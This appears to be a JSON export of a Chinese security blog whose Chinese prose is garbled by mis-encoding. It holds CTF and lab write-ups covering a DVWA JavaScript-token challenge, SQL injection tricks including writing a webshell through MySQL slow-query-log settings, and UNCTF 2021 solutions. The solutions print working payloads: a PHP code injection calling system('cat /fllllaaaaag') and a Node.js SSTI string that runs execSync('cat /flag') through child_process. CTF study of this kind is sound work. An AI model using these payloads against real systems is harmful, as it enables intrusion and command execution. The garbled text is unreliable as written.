Attackslowç›´æ¥è¾“å…¥successè¿›å»ï¼Œå‘ç°æç¤ºæˆ‘ä»¬tokenä¸åŒ¹é…ã€‚æˆ‘ä»¬ä½¿ç”¨burp suiteæŠ“åŒ…æŸ¥çœ‹è¯·æ±‚å¤´æ–‡ä»¶ï¼š æˆ‘ä»¬å‘ç°æ ¹æ®è¿™ä¸ªå¤´çš„å†…å®¹çŒœæµ‹ï¼Œåç«¯é€»è¾‘åº”è¯¥æ˜¯éªŒè¯tokenå’Œphraseæ˜¯å¦åŒ¹é…ï¼Œä¸”å¦‚æœphraseçš„å€¼ä¸ºsuccessï¼Œåˆ™è¿”å›è¿‡å…³æç¤ºï¼Œå¦åˆ™è¿”å›é”™è¯¯åŸå› ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆçŸ¥é“tokenä¸phraseä¹‹é—´çš„å…³ç³»å‘¢ï¼Ÿå†çœ‹çœ‹æºç å‘ç°è¿™æ ·å‡ è¡Œï¼š 1234function generate_token() &#123; var phrase = document.getElementById(&quot;phrase&quot;).value; document.getElementById(&quot;token&quot;).value = md5(rot13(phrase)); &#125; phraseçš„å€¼å…ˆè¿›è¡Œrot13ç¼–ç ï¼Œå†è¿›è¡Œmd5åŠ å¯†å¾—åˆ°tokenå€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æœ‰åŠæ³•è·å–åˆ°tokenäº†ï¼š æœ€åæ›´æ”¹POSTçš„å†…å®¹ï¼š mediumæŸ¥çœ‹medium.jsï¼š 12345678910111213function do_something(e)&#123; for(var t=&quot;&quot;,n=e.length-1;n&gt;=0;n--) t+=e[n]; return t&#125;setTimeout(function()&#123;do_elsesomething(&quot;XX&quot;)&#125;,300);function do_elsesomething(e)&#123;document.getElementById(&quot;token&quot;).value=do_something(e+document.getElementById(&quot;phrase&quot;).value+&quot;XX&quot;)&#125; ä¸éš¾çœ‹å‡ºè¿™é‡Œå°†phraseå€’åºè¾“å‡ºååœ¨å‰ä¸¤ä½ä¸åä¸¤ä½è¡¥ä¸Šäº†XXä½œä¸ºtokenï¼Œé€šè¿‡æŠ“åŒ…æˆ‘ä»¬ä¹Ÿå¯ä»¥æ˜æ˜¾å‘ç°è¿™ä¸ªè§„å¾‹ï¼š 1token=XXeMegnahCXX&amp;phrase=ChangeMe&amp;send=Submit é‚£ä¹ˆè¿™é‡Œçš„tokenå°±å¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬æ„å»ºpayloadï¼š 1token=XXsseccusXX&amp;phrase=success&amp;send=Submit POSTåˆ°ç½‘é¡µä¸­ï¼š è¿™é‡Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬è¾“å…¥successï¼Œæ¥ç€åœ¨æ§åˆ¶å°æ‰§è¡Œè°ƒç”¨do_elsesomething(&quot;XX&quot;)ï¼Œä¹Ÿå¯ä»¥æˆåŠŸæ³¨å…¥ï¼š highæŸ¥çœ‹high.jså‘ç°è¢«æ··æ·†äº†ï¼Œæˆ‘ä»¬è¿›è¡Œè§£ç ï¼šDeobfuscate Javascript 12345678910111213141516171819function do_something(e) &#123; for (var t = &quot;&quot;, n = e.length - 1; n &gt;= 0; n--) t += e[n]; return t&#125;function token_part_3(t, y = &quot;ZZ&quot;) &#123; document.getElementById(&quot;token&quot;).value = sha256(document.getElementById(&quot;token&quot;).value + y)&#125;function token_part_2(e = &quot;YY&quot;) &#123; document.getElementById(&quot;token&quot;).value = sha256(e + document.getElementById(&quot;token&quot;).value)&#125;function token_part_1(a, b) &#123; document.getElementById(&quot;token&quot;).value = do_something(document.getElementById(&quot;phrase&quot;).value)&#125;document.getElementById(&quot;phrase&quot;).value = &quot;&quot;;setTimeout(function() &#123; token_part_2(&quot;XX&quot;)&#125;, 300);document.getElementById(&quot;send&quot;).addEventListener(&quot;click&quot;, token_part_3);token_part_1(&quot;ABCD&quot;, 44); çœ‹çš„å¤´éƒ½å¤§äº†ï¼Œç»“åˆwpæˆ‘ä»¬æ¥æ…¢æ…¢åˆ†æã€‚ é¦–å…ˆdocument.getElementById(&quot;phrase&quot;).value = &quot;&quot;å°†phraseçš„å€¼ç½®ç©ºï¼Œæ¥ç€å»¶è¿Ÿ300msåæ‰§è¡Œtoken_part_2(&quot;XX&quot;)ï¼Œæ¥ç€å½“æŒ‰ä¸‹æŒ‰é’®åæ‰§è¡Œtoken_part_3ï¼Œæœ€åæ‰§è¡Œtoken_part_1ã€‚å› æ­¤è¯»æ‡‚è¿è¡Œé€»è¾‘åï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œé€»è¾‘åˆ†æäº†ã€‚ é¦–å…ˆæ‰§è¡Œtoken_part_1(&quot;ABCD&quot;, 44)å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è°ƒç”¨do_something(e)å‡½æ•°å°†phraseå€’åºå¹¶å¤åˆ¶ç»™token æ¥ç€å»¶è¿Ÿ300ç§’åï¼Œæ‰§è¡Œtoken_part_2(&quot;XX&quot;)å‡½æ•°ï¼Œç”Ÿæˆï¼ˆXX+phraseï¼‰çš„sha256å€¼å¹¶å¤åˆ¶ç»™token åœ¨ç‚¹å‡»æŒ‰é’®è§¦å‘clickäº‹ä»¶åï¼Œæ‰§è¡Œtoken_part_3å‡½æ•°ï¼Œç”Ÿæˆï¼ˆZZ+ä¸Šä¸€æ­¥ä¸­çš„tokenï¼‰çš„sha256å€¼å¤åˆ¶ç»™tokenï¼Œç”Ÿæˆæœ€åæˆ‘ä»¬æ‰€çœ‹åˆ°çš„tokenã€‚ åˆ†æç»“æŸäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å‘ç°é—®é¢˜å‡ºåœ¨phraseç½®ç©ºä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç¼–è¾‘successï¼Œæå‰è°ƒç”¨token_part_1(&quot;ABCD&quot;, 44)å’Œtoken_part_2(&quot;XX&quot;)ï¼Œæœ€åç‚¹å‡»submitä»¥ç»•è¿‡å¯¹phraseçš„ç½®ç©ºï¼š æ€»ç»“è¿™ä¸ªé¶åœºæ¶‰åŠçš„çŸ¥è¯†ç‚¹è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œä»CSRFï¼Œåˆ°XSSï¼Œå†åˆ°JSï¼Œåæ­£ç†è®ºæ˜¯å­¦äº†ä¸å°‘ï¼Œä¸è¿‡ç†è®ºè¿˜æ˜¯å¾—è½¬åŒ–ä¸ºå®æˆ˜èƒ½åŠ›ï¼Œå¦åˆ™å°±æ˜¯çº¸ä¸Šè°ˆå…µäº†ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -DVWA","slug":"web-DVWA","permalink":"http://example.com/tags/web-DVWA/"}]},{"title":"å…³äºsqlæ³¨å…¥æ–¹æ³•çš„è¡¥å……","slug":"å…³äºsqlæ³¨å…¥æ–¹æ³•çš„è¡¥å……","date":"2021-12-07T13:26:44.000Z","updated":"2021-12-13T15:07:22.728Z","comments":true,"path":"2021/12/07/å…³äºsqlæ³¨å…¥æ–¹æ³•çš„è¡¥å……/","link":"","permalink":"http://example.com/2021/12/07/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E7%9A%84%E8%A1%A5%E5%85%85/","excerpt":"å‰è¨€æ‰“äº†äº›æ¯”èµ›åå‘ç°sqlæ³¨å…¥è¿˜æœ‰å¾ˆå¤šå§¿åŠ¿æ²¡æœ‰å­¦ä¼šï¼Œè¿™ç¯‡åšå®¢ä¸“é—¨å¯¹æ–°è§åˆ°çš„sqlæ³¨å…¥è¿›è¡Œè¡¥å……è¯´æ˜ã€‚","text":"å‰è¨€æ‰“äº†äº›æ¯”èµ›åå‘ç°sqlæ³¨å…¥è¿˜æœ‰å¾ˆå¤šå§¿åŠ¿æ²¡æœ‰å­¦ä¼šï¼Œè¿™ç¯‡åšå®¢ä¸“é—¨å¯¹æ–°è§åˆ°çš„sqlæ³¨å…¥è¿›è¡Œè¡¥å……è¯´æ˜ã€‚ æ¨¡ç³ŠæŸ¥è¯¢æ³¨å…¥è¿™æ˜¯ä»unctfçš„ä¸€é“é¢˜ç›®å­¦ä¹ åˆ°çš„ã€‚ å…³äºæ¨¡ç³ŠæŸ¥è¯¢æ¨¡ç³ŠæŸ¥è¯¢çš„è¯­å¥æ ¼å¼ä¸€èˆ¬å¦‚ä¸‹ï¼šSELECT å­—æ®µ(ä¸€èˆ¬ç”¨*) FROM è¡¨ WHERE æŸå­—æ®µ Like æ¡ä»¶ åœ¨mysqlä¸­ï¼Œæ¨¡ç³ŠæŸ¥è¯¢æœ‰å››ç§ç”¨æ³•ï¼š åŒ¹é…ä»»æ„ä¸ªæ•°ä¸ç±»å‹çš„å­—ç¬¦ 123%a%ï¼šæŠŠæŸå­—æ®µä¸­å«æœ‰açš„æ•°æ®å…¨éƒ¨æœç´¢å‡ºæ¥where username like %a% and username like %d%ï¼šæŠŠusernameå­—æ®µä¸­å«æœ‰aä¸dçš„æ•°æ®å…¨éƒ¨æœç´¢å‡ºæ¥%a%d%ï¼šæŠŠæŸå­—æ®µä¸­å«æœ‰aå’Œdçš„æ•°æ®å…¨éƒ¨æœç´¢å‡ºæ¥ï¼Œå¹¶ä¸”aåœ¨dçš„å‰é¢ åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ 123_a_ï¼šæŠŠæŸå­—æ®µä¸­ä¸‰ä¸ªå­—çš„ä¸”ä¸­é—´ä¸ºaçš„æ•°æ®å…¨éƒ¨æœç´¢å‡ºæ¥__aï¼šæŠŠæŸå­—æ®µä¸­ä¸‰ä¸ªå­—çš„ä¸”æœ€åä¸ºaçš„æ•°æ®å…¨éƒ¨æœç´¢å‡ºæ¥ç­‰ç­‰ æŒ‡å®šä¸€ä¸ªèŒƒå›´ 1[abc]1ï¼šæœç´¢a1ã€b1ä¸c1ï¼Œå¦‚æœä¸­æ‹¬å·å†…ä¸ºè¿ç»­çš„æ•°å­—æˆ–å­—æ¯ï¼Œå¯ä»¥ç®€å†™ä¸º[1-5]æˆ–è€…[a-e] æŒ‡å®šä¸€ä¸ªèŒƒå›´æ’é™¤ä¹‹ 1[^abc]1ï¼šæœç´¢é™¤a1ã€b1ä¸c1å¤–_1çš„ç»“æœï¼Œå¦‚æœä¸­æ‹¬å·å†…ä¸ºè¿ç»­çš„æ•°å­—æˆ–å­—æ¯ï¼Œå¯ä»¥ç®€å†™ä¸º[^1-5]æˆ–è€…[^a-e] ä½¿ç”¨æ¡ä»¶åœ¨ç™»å½•æ—¶è¦ç™»å½•adminä½†æ˜¯è¢«é™åˆ¶ç™»å½•ï¼ˆä¾‹å¦‚é™åˆ¶ipï¼‰æ—¶å¯ä»¥ä½¿ç”¨æ¨¡ç³ŠæŸ¥è¯¢ï¼Œä¹Ÿå°±æ˜¯å·²çŸ¥è¦æŸ¥è¯¢çš„æ•°æ®åæ—¶å¯ä»¥ä½¿ç”¨ã€‚ æ…¢æŸ¥è¯¢æ—¥å¿—è¿™æ˜¯æ·±è‚²æ¯ä¸­çš„ezsqlé¢˜ç›®ï¼Œç”¨åˆ°äº†æ…¢æŸ¥è¯¢æ—¥å¿—æ¥è¿›è¡Œsqlæ³¨å…¥ã€‚ å…³äºæ…¢æŸ¥è¯¢æ—¥å¿—MySQLçš„æ…¢æŸ¥è¯¢æ—¥å¿—ç”¨æ¥è®°å½•åœ¨MySQLä¸­å“åº”æ—¶é—´è¶…è¿‡é˜€å€¼çš„è¯­å¥ï¼Œå…·ä½“æŒ‡è¿è¡Œæ—¶é—´è¶…è¿‡long_query_timeå€¼çš„SQLè¯­å¥ï¼Œä¼šè¢«è®°å½•åˆ°æ…¢æŸ¥è¯¢æ—¥å¿—ä¸­ã€‚long_query_timeçš„é»˜è®¤å€¼ä¸º10ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒMysqlæ•°æ®åº“å¹¶ä¸å¯åŠ¨æ…¢æŸ¥è¯¢æ—¥å¿—ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ¥è®¾ç½®è¿™ä¸ªå‚æ•°ã€‚ ä½¿ç”¨æ–¹æ³•é¦–å…ˆä½¿ç”¨setglobal slow_query_log=1;å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—ï¼Œæ¥ç€ç”¨setglobal slow_query_log_file=&#39;&#39;;è®¾ç½®æ…¢æŸ¥è¯¢æ—¥å¿—çš„ä½ç½®ã€‚è¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨sleep()è®¾ç½®æ‰§è¡Œæ—¶é—´ï¼Œå¦‚æœsleepè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ…¢æŸ¥è¯¢æ—¥å¿—çš„æ—¶é—´å€¼ï¼šsetglobal long_query_time=0.000001;ï¼Œç„¶åå†æŸ¥è¯¢webshellè®¿é—®å°±å¯ä»¥äº†ã€‚ çŒœæµ‹åç«¯payloadè¿™æ˜¯buuä¸­çš„[SUCTF 2019]EasySQLè¿™é“é¢˜ç›®ï¼Œæœ‰ä¸¤ç§è§£é¢˜æ–¹æ³•ï¼Œè¿™é‡Œéƒ½ä»‹ç»ä¸‹ã€‚ è·‘ä¸€ä¸‹fuzzå‘ç°èƒ½è¿‡æ»¤çš„åŸºæœ¬éƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è”åˆã€æŠ¥é”™ã€ç›²æ³¨ç­‰æ–¹æ³•éƒ½ä¸èƒ½ä½¿ç”¨ã€‚ è¿™é¢˜è¦æˆ‘ä»¬å¯¹åç«¯è¯­å¥è¿›è¡ŒçŒœæµ‹ï¼Œè¿™æ˜¯è¿™é¢˜æœ€éš¾çš„åœ°æ–¹ï¼Œé€šè¿‡è¾“å…¥éé›¶æ•°å­—å¾—åˆ°çš„å›æ˜¾1å’Œè¾“å…¥å…¶ä½™å­—ç¬¦å¾—ä¸åˆ°å›æ˜¾æ¥åˆ¤æ–­å‡ºå†…éƒ¨çš„æŸ¥è¯¢è¯­å¥å¯èƒ½å­˜åœ¨æœ‰||ï¼Œä¹Ÿå°±æ˜¯select è¾“å…¥çš„æ•°æ®||å†…ç½®çš„ä¸€ä¸ªåˆ—å from è¡¨åã€‚æ¥ç€ä½¿ç”¨å †å æ³¨å…¥éªŒè¯ï¼Œå¾—å‡ºpayloadå¤§æ¦‚ä¸ºï¼š 1sql=&quot;select&quot;.sql=&quot;select&quot;.post[â€˜queryâ€™].&quot;||flag from Flag&quot;; æ–¹æ³•ä¸€è¾“å…¥*ï¼Œ1ï¼Œä½¿è¯­å¥å˜ä¸ºï¼š 1select *,1||flag from Flag æ­¤æ—¶1||flagè®¡ç®—ä¸º1ï¼Œå› æ­¤payloadæœ€ç»ˆè¢«è¯†åˆ«ä¸ºï¼š 1select *,1 from Flag æ–¹æ³•äºŒä½¿ç”¨å †å æ³¨å…¥å†™å…¥select @@global.sql_modeæŸ¥çœ‹ï¼Œå‘ç°PIPES_AS_CONCATï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚ è¾“å…¥1;set sql_mode=pipes_as_concat;select 1ï¼Œè¿™é‡Œä½¿ç”¨åˆ°äº†pipes_as_concatä½¿||å˜ä¸ºè¿æ¥æ“ä½œç¬¦ï¼Œè¿™æ ·å°±ç»•è¿‡äº†åŸæœ¬åº”æœ‰çš„åˆ¤æ–­å¯¼è‡´è¯­å¥æ— è¿”å›å€¼ã€‚ è¿™é‡Œå¯¹å¸¸è§çš„sql_modeå€¼è¿›è¡Œè¡¥å……ï¼š ONLY_FULL_GROUP_BYï¼šå‡ºç°åœ¨selectè¯­å¥ã€HAVINGæ¡ä»¶å’ŒORDER BYè¯­å¥ä¸­çš„åˆ—ï¼Œå¿…é¡»æ˜¯GROUP BYçš„åˆ—æˆ–è€…ä¾èµ–äºGROUP BYåˆ—çš„å‡½æ•°åˆ—ã€‚NO_ZERO_IN_DATEï¼šè¿™ä¸ªæ¨¡å¼å½±å“äº†æ˜¯å¦å…è®¸æ—¥æœŸä¸­çš„æœˆä»½å’Œæ—¥åŒ…å«0ã€‚ ERROR_FOR_DIVISION_BY_ZEROï¼šåœ¨INSERTæˆ–UPDATEè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ•°æ®è¢«é›¶é™¤ï¼Œåˆ™äº§ç”Ÿé”™è¯¯è€Œéè­¦å‘Šã€‚å¦‚æœæœªç»™å‡ºè¯¥æ¨¡å¼ï¼Œé‚£ä¹ˆæ•°æ®è¢«é›¶é™¤æ—¶MySQLè¿”å›NULL NO_ENGINE_SUBSTITUTIONï¼šå¦‚æœéœ€è¦çš„å­˜å‚¨å¼•æ“è¢«ç¦ç”¨æˆ–æœªç¼–è¯‘ï¼Œé‚£ä¹ˆæŠ›å‡ºé”™è¯¯ã€‚ä¸è®¾ç½®æ­¤å€¼æ—¶ï¼Œç”¨é»˜è®¤çš„å­˜å‚¨å¼•æ“æ›¿ä»£ï¼Œå¹¶æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ PIPES_AS_CONCATï¼šå°†â€||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œè¿™å’ŒOracleæ•°æ®åº“æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼ ANSI_QUOTESï¼šå¯ç”¨ANSI_QUOTESåï¼Œä¸èƒ½ç”¨åŒå¼•å·æ¥å¼•ç”¨å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«è§£é‡Šä¸ºè¯†åˆ«ç¬¦","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -sql","slug":"web-sql","permalink":"http://example.com/tags/web-sql/"}]},{"title":"ã€unctf2021ã€‘write up","slug":"ã€unctf2021ã€‘write-up","date":"2021-12-06T11:15:46.000Z","updated":"2021-12-07T04:20:38.593Z","comments":true,"path":"2021/12/06/ã€unctf2021ã€‘write-up/","link":"","permalink":"http://example.com/2021/12/06/%E3%80%90unctf2021%E3%80%91write-up/","excerpt":"å‰è¨€unctfçš„é¢˜æŒºæœ‰æ„æ€çš„ï¼Œé¢˜å‹ä¹Ÿå¾ˆæ–°ï¼Œä¸è¿‡æˆ‘ä¸»è¦è¿˜æ˜¯åšäº†miscå’Œå¯†ç ï¼Œwebæ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹æŒºå¤šçš„ï¼Œå°±å¾ˆå¤šæ²¡åšå‡ºæ¥ã€‚","text":"å‰è¨€unctfçš„é¢˜æŒºæœ‰æ„æ€çš„ï¼Œé¢˜å‹ä¹Ÿå¾ˆæ–°ï¼Œä¸è¿‡æˆ‘ä¸»è¦è¿˜æ˜¯åšäº†miscå’Œå¯†ç ï¼Œwebæ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹æŒºå¤šçš„ï¼Œå°±å¾ˆå¤šæ²¡åšå‡ºæ¥ã€‚ Miscç®€å•æ—¥å¿—å®¡è®¡çœŸçš„å¾ˆç®€å•ï¼Œæ‰“å¼€æ—¥å¿—å‘ç°åº”è¯¥æ˜¯åœ¨è¿›è¡Œç›®å½•æ‰«æï¼Œä½†æ˜¯å¤§å¤šéƒ½çˆ†404äº†ï¼Œä¸è¿‡å…¶ä¸­æœ‰ä¸¤è¡Œbase64ä»£ç è¿”å›äº†500ï¼Œæˆ‘ä»¬base64è§£ç å‘ç°è¿™æ ·ä¸€ä¸²ï¼šå¯¹ï¼Œcatåé¢çš„éƒ¨åˆ†å°±æ˜¯flagï¼šUNCTF{CTF?YouShouJiuXing} å¼•å¤§æµå’¯ï¼Œhappyå¼€é—¨è§è´æ‹‰ï¼Œè¿™é¢˜ç»™äº†æè¿°ï¼šè™šæ©çš„å¤§é—¨åæ˜¯ä¸€å‰¯æ®‹ç¼ºçš„ç”»å·ã€‚æˆ‘ä»¬å°±ä¸éš¾æƒ³åˆ°æ˜¯æ›´æ”¹å›¾ç‰‡çš„é«˜åº¦ï¼Œ010ç¼–è¾‘å›¾ç‰‡é«˜åº¦ï¼Œå‘ç°flagï¼š ç”µä¿¡è¯ˆéª—ç»™äº†ä¸€ä¸²å¥‡å¥‡æ€ªæ€ªçš„å€¼ï¼šqi]m^roVibdVbXUU`hï¼Œè¿™å¾ˆæ˜æ˜¾å¹¶ä¸æ˜¯ä»€ä¹ˆç¼–ç æ ¼å¼ï¼Œé¢˜ç›®æç¤ºæˆ‘ä»¬flagçš„æ ¼å¼ä¸ºunctf{}ï¼Œé‚£ä¹ˆæˆ‘ä»¬é‚£å‰5ä½çš„asciiç å€¼åˆ†åˆ«äºunctfçš„asciiç å€¼æ¯”è¾ƒï¼Œå‘ç°åˆ†åˆ«å·®äº†4,5,6,7,8ä½ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‰¾åˆ°äº†è§„å¾‹ï¼Œç¼–å†™è„šæœ¬ï¼š 123456789101112131415#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;int main()&#123; char s[]= &quot;qi]m^roVibdVbXUU`h&quot;; int n = 4; for (int i = 0; i &lt; sizeof(s);i++)&#123; s[i]+=n; n++; &#125; for (int i = 0; i &lt; sizeof(s);i++) cout &lt;&lt; s[i]; return 0;&#125; è·‘å‡ºæ¥ç»“æœä¸ºunctf{yauoreright} å€’ç«‹æ´—å¤´ä¸‹è½½é™„ä»¶å‘ç°æ˜¯ä¸€ä¸²16è¿›åˆ¶ç ï¼Œå¤åˆ¶è¿›010åå‘ç°è¿™ä¸ªåå…­è¿›åˆ¶ç æ˜¯é¢ å€’çš„ï¼Œæˆ‘ä»¬å†™è„šæœ¬æŠŠå®ƒå€’ç«‹è¿‡æ¥ï¼š 1234567input = open(&#x27;key.txt&#x27;,&#x27;rb&#x27;)input_all = input.read()ss = input_all[::-1]output = open(&#x27;true.jpg&#x27;,&#x27;wb&#x27;)output.write(ss)input.close()output.close() å°†å€’ç«‹è¿‡æ¥çš„åå…­è¿›åˆ¶ç å†™å…¥åå‘ç°å¼€å¤´æœ‰exifï¼ŒçŒœæµ‹å¯èƒ½æ–‡ä»¶é‡Œé¢å†™å…¥äº†ä»€ä¹ˆä¸œè¥¿ï¼ŒæŸ¥æ‰¾äº†==å‘ç°äº†ä¸€ä¸²base64ç ï¼š è§£ç åå‘ç°æ˜¯ä¸€ä¸²ä¸ä½›è®ºç¦…å¯†ç ï¼š æœ€åè§£ç ï¼Œè®°å¾—è¦æŠŠä½›æ—¥æ”¹ä¸ºä½›æ›°ï¼š cryptoeasy_rsaç›´æ¥ç»™äº†qã€pã€eã€cï¼Œå†™è„šæœ¬å°±èƒ½è·‘å‡ºæ¥äº†ï¼š 123456789101112import libnump=12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101q=9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471e=65537c=28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225n = p*qphi = (p-1)*(q-1)d = libnum.invmod(e,phi)flag = libnum.n2s(pow(c,d,n))print(flag) æ¢ç§˜ä¸­ä¸–çºªåŸå ¡12å¹´è½»çš„å¤§å¸ç‡é¢†ç€64ä½çš‡çˆéª‘å£«å†²ç ´äº†åŒé‡é˜»æ å¤ºä¸‹äº†åŸæ± ã€‚AZSLh2OofBA0C2qzi25mg2KsYqW7iCSdDq9aBLKsDBWyi259 æ ¹æ®æç¤ºåˆ¤æ–­æ˜¯å‡¯æ’’å¯†ç å’Œæ …æ å¯†ç ï¼Œå…ˆè·‘å‡¯æ’’å¯†ç ï¼Œä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆç»“æœï¼Œå› æ­¤æƒ³åˆ°å†è¿›è¡Œä¸€æ¬¡base64è§£å¯†ï¼Œè¿™æ¬¡å½“å‡¯æ’’å¯†ç keyå€¼ä¸º7æ—¶ï¼Œè·‘å‡ºæ¥äº†ç»“æœï¼š å†æ ¹æ®æç¤ºè¿›è¡Œæ …æ è§£å¯†ï¼Œkeyä¸º2ï¼š åˆ†æbadusbæµé‡å…·ä½“åŸç†å‚è€ƒä¸‹é¢ä¸¤ç¯‡åšå®¢ï¼šlinux usbé”®ç›˜é©±åŠ¨è¯¦è§£Linux input.h æ¯ä¸€è¡Œ4ä½ï¼Œå‰ä¸¤ä¸ªå€¼20åˆ™å¯¹åº”å¤§å†™ï¼Œ00åˆ™æ— å¤§å†™ã€‚å¯¹åº”å‡ºflagä¸ºUNCTF{Y0u-Are-very-n1ce} ç”µä¿¡è¯ˆéª—proä¹Ÿæ˜¯ä¸€ä¸²å¥‡æ€ªçš„ç ï¼š5.#4&amp;;Sw)2Ti%*Sj1eUU9kTwi*Sj)1S&quot;a8S0)6x-8(x7= ä½†æ˜¯æœ‰äº†ä¸Šæ¬¡çš„ç»éªŒï¼Œè¿™æ¬¡æˆ‘ä»¬ä¹Ÿç”¨ç›¸åŒçš„æ–¹æ³•åˆ¤æ–­å‰5ä½ï¼Œå‘ç°æ¯ä¸€ä½çš„asciiç å€¼ä¸unctfçš„asciiç›¸å·®éƒ½æ˜¯64ã€‚å¦‚æœè¶…è¿‡äº†asciiç æœ€å¤§å€¼çš„è¯ï¼Œå°±ä»32å¼€å§‹ç»§ç»­è®¡ç®—ï¼Œå†™è„šæœ¬ï¼š 1234567891011121314151617181920#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;int main()&#123; char s[]= &quot;5.#4&amp;;Sw)2Ti\\%*Sj1eUU9kTwi*Sj\\)1S\\&quot;a8S0\\)6x-8\\(x7=&quot;; int n = 64, h; for (int i = 0; i &lt; sizeof(s);i++)&#123; if(s[i]&lt;=62) s[i] += n; else&#123; h = 126 - s[i]; s[i] = 32; s[i] = s[i] + n - h; &#125; &#125; for (int i = 0; i &lt; sizeof(s);i++) cout &lt;&lt; s[i]; return 0;&#125; flagä¸ºunctf{5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw} webfuzz_md5GETä¸€ä¸ªuserä¸ºunctfï¼Œä½†æ˜¯ä¼šè¿›è¡Œæ›¿æ¢ï¼Œè¿™ä¸ªåœ°æ–¹åŒå†™å°±å¯ä»¥ç»•è¿‡äº†ã€‚æ¥ç€è¦POSTä¸€ä¸ªpassä½¿md5åç¼–ç çš„å€¼å¼€å¤´äº”ä½ä¸º66666ï¼Œè¿™é‡Œå› ä¸ºæˆ‘æœ‰md5å­—å…¸æ‰€ä»¥å°±ç›´æ¥æ‰¾å‡ºæ¥äº†ï¼š can_you_hacked_meçœ‹ä¸Šå»å¾ˆåƒsqlï¼Œä½†æ˜¯ç¿»æºç å‘ç°æç¤ºæˆ‘ä»¬www.zipï¼Œä¸‹è½½ä¸‹æ¥æœ‰ä¸€ä»½æºç å’Œä¸€ä»½æ•°æ®åº“æ–‡ä»¶ã€‚æ•°æ®åº“æ–‡ä»¶ç»™äº†ç®¡ç†å‘˜çš„è´¦å·å¯†ç ï¼Œä½†æ˜¯æºç æŒ‡å‡ºå¿…é¡»æœ¬åœ°ç™»å½•æ‰èƒ½è·å¾—flagï¼Œè€Œä¸”è¿™é‡Œç”¨äº†`$_SERVER[&quot;REMOTE_ADDR&quot;]`è·å–ipï¼Œè¿™ä¸ªipæ˜¯ä¸èƒ½é€šè¿‡å¤´æ–‡ä»¶ä¼ªé€ çš„ã€‚ å› æ­¤è¿™é¢˜è¿˜çœŸæ˜¯sqlæ³¨å…¥ï¼Œç”¨åˆ°äº†likeçš„æ¨¡ç³ŠæŸ¥è¯¢æ„å»ºpayloadï¼š phpmysqlæ„å»ºpayloadï¼šhost=ls&amp;user=DirectoryIterator&amp;pwd=&quot;/&quot;);system(&quot;cat /fllllaaaaag&quot;);echo (&quot;1&quot; ç”¨DirectoryIteratoréå†ç›®å½•ï¼Œå…ˆé—­åˆpwdå˜é‡ï¼Œæ¥ç€ç”¨systemè¿”å›cat /fllllaaaaagçš„å€¼ï¼Œæœ€åå†æ¬¡é—­åˆæ‹¬å·ã€‚ nodejs_sstiæ„å»ºpayloadï¼š&#123;&#123;''.constructor.constructor(\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()\")()&#125;&#125;","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"cookieã€sessionä¸token","slug":"cookieã€sessionä¸token","date":"2021-12-05T04:29:39.000Z","updated":"2021-12-05T09:12:39.426Z","comments":true,"path":"2021/12/05/cookieã€sessionä¸token/","link":"","permalink":"http://example.com/2021/12/05/cookie%E3%80%81session%E4%B8%8Etoken/","excerpt":"å‰è¨€ç”±äºhttpåè®®çš„æ— çŠ¶æ€æ€§ï¼Œå¯¼è‡´æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚åå¾—åˆ°çš„éƒ½æ˜¯å…¨æ–°çš„è¯·æ±‚ï¼Œä¸çŸ¥é“å†å²è®°å½•ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¾¿å¼•å…¥äº†cookieå’Œsessionæ¥å¼¥è¡¥è¿™ä¸ªä¸è¶³ã€‚","text":"å‰è¨€ç”±äºhttpåè®®çš„æ— 